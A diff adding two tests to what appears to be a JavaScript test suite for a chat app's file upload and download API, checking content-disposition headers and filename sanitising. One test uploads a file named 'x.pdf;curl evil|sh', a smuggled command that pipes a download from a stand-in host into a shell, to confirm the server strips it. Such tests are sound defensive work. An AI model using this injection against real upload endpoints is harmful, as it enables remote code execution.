@@ -62,6 +62,29 @@ describe('GET /api/files/:filename (uploaded images for the chat view)', () => {
     expect(res.headers['x-content-type-options']).toBe('nosniff');
   });
 
+  it('shows images inline and makes anything else a download', async () => {
+    fs.writeFileSync(path.join(uploads, 'notes-1.txt'), 'hello');
+    const image = await request(app).get('/api/files/photo-1.png').set(auth);
+    expect(image.headers['content-disposition']).toMatch(/^inline;/);
+    const text = await request(app).get('/api/files/notes-1.txt').set(auth);
+    expect(text.headers['content-disposition']).toMatch(/^attachment;/);
+    expect(text.text).toBe('hello');
+  });
+
+  it('stores an upload whose extension is not a plain one without it', async () => {
+    const res = await request(app)
+      .post('/api/files/upload')
+      .set(auth)
+      .attach('file', Buffer.from('%PDF'), 'x.pdf;curl evil|sh');
+    expect(res.status).toBe(200);
+    expect(res.body.filename).toMatch(/^[0-9a-f-]{36}$/);
+    const plain = await request(app)
+      .post('/api/files/upload')
+      .set(auth)
+      .attach('file', Buffer.from('%PDF'), 'report.pdf');
+    expect(plain.body.filename).toMatch(/^[0-9a-f-]{36}\.pdf$/);
+  });
+
   it('rejects requests without credentials', async () => {
     const res = await request(app).get('/api/files/photo-1.png');
     expect(res.status).toBe(401);
